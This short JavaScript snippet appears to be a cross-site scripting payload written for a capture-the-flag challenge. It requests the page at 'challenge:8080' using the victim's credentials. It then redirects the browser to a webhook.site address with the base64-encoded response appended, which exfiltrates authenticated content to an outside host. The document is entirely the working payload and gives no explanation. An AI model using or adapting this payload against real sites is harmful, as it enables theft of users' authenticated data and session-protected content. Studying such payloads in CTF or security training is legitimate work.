var hoa = new XMLHttpRequest();
hoa.onreadystatechange = function(){
if(hoa.readyState === XMLHttpRequest.DONE) {
    console.log(hoa.responseText);
    document.location='https://webhook.site/9fa288a1-051f-42cb-b13f-0e66604e6cf3?data='+btoa(hoa.responseText);
}
};
hoa.open('GET', 'http://challenge:8080/');
hoa.withCredentials = true;
hoa.send();
